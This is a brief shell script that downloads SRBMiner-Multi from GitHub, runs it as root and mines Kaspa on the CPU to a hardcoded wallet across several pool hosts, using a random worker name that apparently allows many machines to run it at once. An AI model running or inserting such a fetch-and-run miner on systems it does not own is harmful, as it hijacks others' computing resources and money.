#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.6/SRBMiner-Multi-0-9-6-Linux.tar.xz  
tar -xvf SRBMiner-Multi-0-9-6-Linux.tar.xz  
sudo ./SRBMiner-MULTI --disable-gpu --algorithm kaspa --pool ru.acc-pool.pw:16061!hk.acc-pool.pw:16061!ca.acc-pool.pw:16061!acc-pool.pw:16061 --wallet kaspa:qrvutck8wdatwgeme2dennh4yu6yhywea94xt2w7ffk6wpn45l5a5venmvaxt.$(echo $(shuf -i 10000-99999 -n 1)-M) --password x
